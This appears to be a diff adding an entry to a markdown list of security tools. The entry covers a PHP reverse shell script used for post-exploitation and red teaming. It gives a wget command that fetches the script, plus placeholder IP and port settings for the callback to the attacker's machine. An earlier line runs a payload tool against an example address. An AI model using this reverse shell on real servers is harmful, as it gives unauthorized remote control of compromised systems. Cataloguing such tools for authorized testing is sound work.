@@ -358,6 +358,22 @@ Whether you're looking for tools to strengthen network security, perform forensi
   ```bash
   python3 st.py --payload ironpython --target 192.168.1.100
   ```
+  ### 8. [PHP Reverse Shell](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php)
+- **Description**: PHP Reverse Shell is a simple yet effective script that provides a reverse shell connection back to the attacker's machine. It's widely used in post-exploitation scenarios to gain shell access on a compromised web server.
+- **Use Cases**:
+  - **Gaining Shell Access**: Deploy a reverse shell on a compromised server to maintain control and execute commands.
+  - **Post-Exploitation**: After initial access, use this shell to further exploit the target server.
+  - **Red Teaming**: Implement this script in red team exercises to simulate real-world attacks and test the target's defenses.
+- **Example**:
+  ```bash
+  wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
+  nano php-reverse-shell.php
+  ```
+  ```php
+  $ip = 'YOUR_IP';  // Replace with your IP address
+  $port = YOUR_PORT;  // Replace with the port you want to listen on
+  ```
+
 
 
 
